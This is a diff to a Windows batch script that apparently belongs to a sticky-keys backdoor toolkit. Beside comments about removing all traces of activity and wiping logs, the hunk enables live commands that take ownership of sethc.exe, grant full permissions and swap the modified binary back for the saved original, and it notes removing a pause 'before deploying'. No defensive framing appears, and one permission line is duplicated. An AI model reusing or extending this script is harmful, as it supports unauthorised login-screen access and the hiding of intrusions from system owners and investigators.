@@ -40,11 +40,12 @@ REM remove all traces of activity
 REM wipe the logs
 
 REM put sticky keys back to normal
-REM takeown /f c:\windows\system32\cmd.exe
-REM takeown /f c:\windows\system32\sethc.exe
-REM icacls c:\windows\system32\cmd.exe /grant %username%:F /q /t
-REM icacls c:\windows\system32\sethc.exe /grant %username%:F /q /t
-REM move sethc.exe sethc.old.exe
-REM copy calc.exe sethc.exe
+takeown /f c:\windows\system32\sethc.exe
+takeown /f c:\windows\system32\sethcold.exe
+icacls c:\windows\system32\sethc.exe /grant %username%:F /q /t
+icacls c:\windows\system32\sethc.exe /grant %username%:F /q /t
+ren sethc.exe sethcbad.exe
+ren sethcold.exe sethc.exe
+
 pause
 REM take out the pause before deploying
